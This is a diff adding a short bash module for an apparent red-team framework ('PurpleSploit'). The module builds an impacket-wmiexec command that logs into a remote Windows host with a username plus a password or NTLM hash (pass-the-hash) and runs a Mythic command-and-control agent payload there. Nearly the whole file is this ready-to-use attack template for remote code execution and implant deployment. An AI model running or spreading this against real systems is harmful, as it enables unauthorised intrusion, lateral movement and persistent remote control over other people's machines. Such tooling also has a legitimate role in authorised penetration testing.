@@ -1,0 +1,13 @@
+#!/bin/bash
+# Mythic Agent Deployment via WMIExec
+
+MODULE_NAME="c2/mythic/deploy_wmiexec"
+MODULE_CATEGORY="c2"
+MODULE_DESCRIPTION="Deploy Mythic agent via Impacket WMIExec"
+MODULE_AUTHOR="PurpleSploit Team"
+MODULE_TOOL="impacket-wmiexec"
+
+REQUIRED_VARS="RHOST,USERNAME,MYTHIC_PAYLOAD"
+OPTIONAL_VARS="PASSWORD:,DOMAIN:,HASH:"
+
+COMMAND_TEMPLATE="impacket-wmiexec \${DOMAIN:+\$DOMAIN/}\${USERNAME}:\${PASSWORD}@\${RHOST} \${HASH:+-hashes :\$HASH} '\${MYTHIC_PAYLOAD}'"
